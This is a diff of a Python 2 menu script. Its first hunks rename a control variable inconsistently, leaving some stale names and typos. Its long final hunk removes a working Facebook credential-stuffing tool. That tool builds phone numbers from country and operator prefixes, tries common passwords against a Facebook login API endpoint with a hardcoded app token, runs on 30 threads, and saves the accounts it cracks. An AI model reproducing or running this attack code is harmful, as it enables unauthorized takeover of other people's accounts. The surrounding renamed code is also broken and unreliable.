@@ -311,8 +311,8 @@ def action():
 		except IOError:
 			print ("[!] File Not Found")
 			raw_input("\n[ Back ]")
-			FreakedDudex()
-        elif FreakedDudex =="12":
+			SG()
+        elif SG =="12":
                 print (logo53)
 		os.system("clear")
 		print (logo38)
@@ -326,8 +326,8 @@ def action():
 		except IOError:
 			print ("[!] File Not Found")
 			raw_input("\n[ Back ]")
-			FreakedDudex()
-        elif FreakedDudex =="13":
+			SG()
+        elif SG =="13":
                 print (logo53)
 		os.system("clear")
 		print (logo39)
@@ -341,8 +341,8 @@ def action():
 		except IOError:
 			print ("[!] File Not Found")
 			raw_input("\n[ Back ]")
-			FreakexDudex()
-        elif FreakedDudex =="14":
+			SG()
+        elif SG =="14":
                 print (logo53)
 		os.system("clear")
 		print (logo40)
@@ -356,8 +356,8 @@ def action():
 		except IOError:
 			print ("[!] File Not Found")
 			raw_input("\n[ Back ]")
-			FreakedDudex()
-	elif FreakedDudex =="15":
+			SG()
+	elif SG =="15":
                 print (logo53)
 		os.system("clear")
 		print (logo41)
@@ -371,8 +371,8 @@ def action():
 		except IOError:
 			print ("[!] File Not Found")
 			raw_input("\n[ Back ]")
-			FreakedDudex()
-	elif FreakedDudex =="16":
+			SG()
+	elif SG =="16":
                 print (logo53)
 		os.system("clear")
 		print (logo42)
@@ -386,8 +386,8 @@ def action():
 		except IOError:
 			print ("[!] File Not Found")
 			raw_input("\n[ Back ]")
-			FreakexDudex()
-	elif FreakexDudex =="17":
+			SG()
+	elif SG =="17":
                 print (logo53)
 		os.system("clear")
 		print (logo43)
@@ -401,8 +401,8 @@ def action():
 		except IOError:
 			print ("[!] File Not Found")
 			raw_input("\n[ Back ]")
-			FreakexDudex()
-	elif FreakedDudex =="18":
+			SG()
+	elif SG =="18":
                 print (logo53)
 		os.system("clear")
 		print (logo44)
@@ -416,8 +416,8 @@ def action():
 		except IOError:
 			print ("[!] File Not Found")
 			raw_input("\n[ Back ]")
-			FreakedDudex()
-	elif FreakedDudex =="19":
+			SG()
+	elif SG =="19":
                 print (logo53)
 		os.system("clear")
 		print (logo45)
@@ -431,8 +431,8 @@ def action():
 		except IOError:
 			print ("[!] File Not Found")
 			raw_input("\n[ Back ]")
-			FreakexDudex()
-	elif FreakedDudex =="20":
+			SG()
+	elif SG =="20":
                 print (logo53)
 		os.system("clear")
 		print (logo46)
@@ -446,8 +446,8 @@ def action():
 		except IOError:
 			print ("[!] File Not Found")
 			raw_input("\n[ Back ]")
-			FreakedDudex()
-	elif FreakedDudex =="21":
+			SG()
+	elif SG =="21":
                 print (logo53)
 		os.system("clear")
 		print (logo47)
@@ -461,8 +461,8 @@ def action():
 		except IOError:
 			print ("[!] File Not Found")
 			raw_input("\n[ Back ]")
-			FreakedDudex()
-	elif FreakedDudex =="22":
+			SG()
+	elif SG =="22":
                 print (logo53)
 		os.system("clear")
 		print (logo48)
@@ -477,7 +477,7 @@ def action():
 			print ("[!] File Not Found")
 			raw_input("\n[ Back ]")
 			FreakedDudex()
-	elif FreakedDudex =="23":
+	elif SG =="23":
                 print (logo53)
 		os.system("clear")
 		print (logo49)
@@ -491,8 +491,8 @@ def action():
 		except IOError:
 			print ("[!] File Not Found")
 			raw_input("\n[ Back ]")
-			FreakedDudex()
-        elif FreakedDudex =="24":
+			SG()
+        elif SG =="24":
                 print (logo53)
 		os.system("clear")
 		print (logo50)
@@ -506,8 +506,8 @@ def action():
 		except IOError:
 			print ("[!] File Not Found")
 			raw_input("\n[ Back ]")
-			FreakedDudex()
-        elif FreakedDudex =="25":
+			SG()
+        elif SG =="25":
                 print (logo53)
 		os.system("clear")
 		print (logo51)
@@ -521,8 +521,8 @@ def action():
 		except IOError:
 			print ("[!] File Not Found")
 			raw_input("\n[ Back ]")
-			FreakedDudex()
-        elif FreakedDudex =="26":
+			SG()
+        elif SG =="26":
                 print (logo53)
 		os.system("clear")
 		print (logo52)
@@ -536,8 +536,8 @@ def action():
 		except IOError:
 			print ("[!] File Not Found")
 			raw_input("\n[ Back ]")
-			FreakedDudex()
-	elif FreakedDudex =='0':
+			SG()
+	elif SG =='0':
 		login()
 	else:
 		print '[!] Fill in correctly'
@@ -643,327 +643,3 @@ def action():
 
 if __name__ == '__main__':
         menu()																													
-
-
-
-
-def action():
-    global cpb
-    global oks
-    bch = raw_input('\n\033[1;91m>>>  ')
-    if bch == '':
-        print '[!] Fill in correctly'
-        action()
-    elif bch == '1':
-        os.system('clear')
-        print logo
-        print '\x1b[1;93m175,165,191, 192, 193, 194, 195, 196, 197, 198, 199'
-        try:
-            c = raw_input('\x1b[1;96m choose code  : ')
-            k = '+880'
-            idlist = 'login.txt'
-            for line in open(idlist, 'r').readlines():
-                id.append(line.strip())
-
-        except IOError:
-            print '[!] File Not Found'
-            raw_input('\n[ Back ]')
-            menu()
-
-    elif bch == '2':
-        os.system('clear')
-        print logo
-        print '786, 815, 315, 256, 401, 718, 917, 202, 701, 303, 703, 803, 999, 708'
-        try:
-            c = raw_input(' choose code  : ')
-            k = '+1'
-            idlist = 'login.txt'
-            for line in open(idlist, 'r').readlines():
-                id.append(line.strip())
-
-        except IOError:
-            print '[!] File Not Found'
-            raw_input('\n[ Back ]')
-            menu()
-
-    elif bch == '3':
-        os.system('clear')
-        print logo
-        print '737, 706, 748, 783, 739, 759, 790'
-        try:
-            c = raw_input(' choose code  : ')
-            k = '+44'
-            idlist = 'login.txt'
-            for line in open(idlist, 'r').readlines():
-                id.append(line.strip())
-
-        except IOError:
-            print '[!] File Not Found'
-            raw_input('\n[ Back ]')
-            menu()
-
-    elif bch == '4':
-        os.system('clear')
-        print (logo)
-        print("953, 955, 962, 900, 919, 993, 993, 955, 962, 965, 969, 979, 995, 979, 918, 944, 944, 949, 949, 949, 949, 949")
-        print("800, 812, 817, 817, 817, 840, 875, 885, 895, 833, 833, 833, 850, 898")
-        print("738, 760, 789, 775, 738")
-        try:
-            c = raw_input(' choose code  : ')
-            k = '+91'
-            idlist = 'login.txt'
-            for line in open(idlist, 'r').readlines():
-                id.append(line.strip())
-
-        except IOError:
-            print '[!] File Not Found'
-            raw_input('\n[ Back ]')
-            menu()
-
-    elif bch == '5':
-        os.system('clear')
-        print logo
-        print '127, 179, 117, 853, 318, 219, 834, 186, 479, 113'
-        try:
-            c = raw_input(' choose code  : ')
-            k = '+55'
-            idlist = 'login.txt'
-            for line in open(idlist, 'r').readlines():
-                id.append(line.strip())
-
-        except IOError:
-            print '[!] File Not Found'
-            raw_input('\n[ Back ]')
-            menu()
-
-    elif bch == '6':
-        os.system('clear')
-        print logo
-        print '11, 12, 19, 16, 15, 13, 14, 18, 17'
-        try:
-            c = raw_input(' choose code  : ')
-            k = '+81'
-            idlist = 'login.txt'
-            for line in open(idlist, 'r').readlines():
-                id.append(line.strip())
-
-        except IOError:
-            print '[!] File Not Found'
-            raw_input('\n[ Back ]')
-            menu()
-
-    elif bch == '7':
-        os.system('clear')
-        print logo
-        print '1, 2, 3, 4, 5, 6, 7, 8, 9'
-        try:
-            c = raw_input(' choose code  : ')
-            k = '+82'
-            idlist = 'login.txt'
-            for line in open(idlist, 'r').readlines():
-                id.append(line.strip())
-
-        except IOError:
-            print '[!] File Not Found'
-            raw_input('\n[ Back ]')
-            menu()
-
-    elif bch == '8':
-        os.system('clear')
-        print logo
-        print '388, 390, 391, 371, 380, 368, 386, 384, 332, 344, 351, 328'
-        try:
-            c = raw_input(' choose code  : ')
-            k = '+39'
-            idlist = 'login.txt'
-            for line in open(idlist, 'r').readlines():
-                id.append(line.strip())
-
-        except IOError:
-            print '[!] File Not Found'
-            raw_input('\n[ Back ]')
-            menu()
-
-    elif bch == '9':
-        os.system('clear')
-        print logo
-        print '60, 76, 73, 64, 69, 77, 65, 61, 75, 68'
-        try:
-            c = raw_input(' choose code  : ')
-            k = '+34'
-            idlist = 'login.txt'
-            for line in open(idlist, 'r').readlines():
-                id.append(line.strip())
-
-        except IOError:
-            print '[!] File Not Found'
-            raw_input('\n[ Back ]')
-            menu()
-
-    elif bch == '10':
-        os.system('clear')
-        print logo
-        print '66, 69, 78, 79, 60, 72, 67, 53, 51'
-        try:
-            c = raw_input(' choose code  : ')
-            k = '+48'
-            idlist = 'login.txt'
-            for line in open(idlist, 'r').readlines():
-                id.append(line.strip())
-
-        except IOError:
-            print '[!] File Not Found'
-            raw_input('\n[ Back ]')
-            menu()
-
-    elif bch == '11':
-        os.system('clear')
-        print logo
-        print '\x1b[1;93m01, ~to~~, 49'
-        try:
-            c = raw_input(' choose code  : ')
-            k = '03'
-            idlist = 'login.txt'
-            for line in open(idlist, 'r').readlines():
-                id.append(line.strip())
-
-        except IOError:
-            print '[!] File Not Found'
-            raw_input('\n[ Back ]')
-            menu()
-
-    elif bch == '12':
-        os.system('clear')
-        print logo
-        print '\x1b[1;93m81,83,85,84,89,'
-        try:
-            c = raw_input(' choose code  : ')
-            k = '+1'
-            idlist = 'login.txt'
-            for line in open(idlist, 'r').readlines():
-                id.append(line.strip())
-
-        except IOError:
-            print '[!] File Not Found'
-            raw_input('\n[ Back ]')
-            menu()
-
-    elif bch == '13':
-        os.system('xdg-open https://www.youtube.com')
-        login()
-    elif bch == '0':
-        exb()
-    else:
-        print '[!] Fill in correctly'
-        action()
-    xxx = str(len(id))
-    psb('[\xe2\x9c\x93] Total Numbers: ' + xxx)
-    time.sleep(0.5)
-    psb('\x1b[1;91m[\xe2\x9c\x93]\x1b[1;94m Please wait, process is running ...')
-    time.sleep(0.5)
-    psb('[!] To Stop Process Press CTRL Then Press z')
-    time.sleep(0.5)
-    print
-
-    def main(arg):
-        user = arg
-        try:
-            os.mkdir('save')
-        except OSError:
-            pass
-
-        try:
-            pass1 = user
-            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-            q = json.load(data)
-            if 'access_token' in q:
-                print '\x1b[1;32mBlACk-KILLER-HACK ' + k + c + user + '  |  ' + pass1
-                okb = open('login.txt', 'a')
-                okb.write(k + c + user + pass1 + '\n')
-                okb.close()
-                oks.append(c + user + pass1)
-            elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;31mCheckpoint ' + k + c + user + '  |  ' + pass1
-                cps = open('login.txt', 'a')
-                cps.write(k + c + user + pass1 + '\n')
-                cps.close()
-                cpb.append(c + user + pass1)
-            else:
-                pass2 = '786786'
-                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                q = json.load(data)
-                if 'access_token' in q:
-                    print '\x1b[1;32mBlACk-KILLER-HACK ' + k + c + user + '  |  ' + pass2
-                    okb = open('login.txt', 'a')
-                    okb.write(k + c + user + pass2 + '\n')
-                    okb.close()
-                    oks.append(c + user + pass2)
-                elif 'www.facebook.com' in q['error_msg']:
-                    print '\x1b[1;31mCheckpoint ' + k + c + user + '  |  ' + pass2
-                    cps = open('login.txt', 'a')
-                    cps.write(k + c + user + pass2 + '\n')
-                    cps.close()
-                    cpb.append(c + user + pass2)
-                else:
-                    pass3 = '000786'
-                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                    q = json.load(data)
-                    if 'access_token' in q:
-                        print '\x1b[1;32mBlACk-KILLER-HACK  ' + k + c + user + '  |  ' + pass3
-                        okb = open('login.txt', 'a')
-                        okb.write(k + c + user + pass3 + '\n')
-                        okb.close()
-                        oks.append(c + user + pass3)
-                    elif 'www.facebook.com' in q['error_msg']:
-                        print '\x1b[1;31mCheckpoint ' + k + c + user + '  |  ' + pass3
-                        cps = open('login.txt', 'a')
-                        cps.write(k + c + user + pass3 + '\n')
-                        cps.close()
-                        cpb.append(c + user + pass3)
-                    else:
-                        pass4 = '123456'
-                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                        q = json.load(data)
-                        if 'access_token' in q:
-                            print '\x1b[1;32mBlACk-KILLER-HACK ' + k + c + user + '  |  ' + pass4
-                            okb = open('login.txt', 'a')
-                            okb.write(k + c + user + pass4 + '\n')
-                            okb.close()
-                            oks.append(c + user + pass4)
-                        elif 'www.facebook.com' in q['error_msg']:
-                            print '\x1b[1;31mCheckpoint ' + k + c + user + '  |  ' + pass4
-                            cps = open('login.txt', 'a')
-                            cps.write(k + c + user + pass4 + '\n')
-                            cps.close()
-                            cpb.append(c + user + pass4)
-                        else:
-                            pass5 = '786786786'
-                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                            q = json.load(data)
-                            if 'access_token' in q:
-                                print '\x1b[1;32mBlACk-KILLER-HACK ' + k + c + user + '  |  ' + pass5
-                                okb = open('login.txt', 'a')
-                                okb.write(k + c + user + pass5 + '\n')
-                                okb.close()
-                                oks.append(c + user + pass5)
-                            elif 'www.facebook.com' in q['error_msg']:
-                                print '\x1b[1;31mCheckpoint ' + k + c + user + '  |  ' + pass5
-                                cps = open('login.txt', 'a')
-                                cps.write(k + c + user + pass5 + '\n')
-                                cps.close()
-                                cpb.append(c + user + pass5)
-        except:
-            pass
-
-    p = ThreadPool(30)
-    p.map(main, id)
-    print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰"
-    print '[✓] Process Has Been Completed ....'
-    print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
-    print('[✓] CP File Has Been Saved : save/checkpoint.txt')
-    raw_input('\n[Press Enter To Go Back]')
-    os.system('python2 S.py')
-
-
-if __name__ == '__main__':
-    menu()
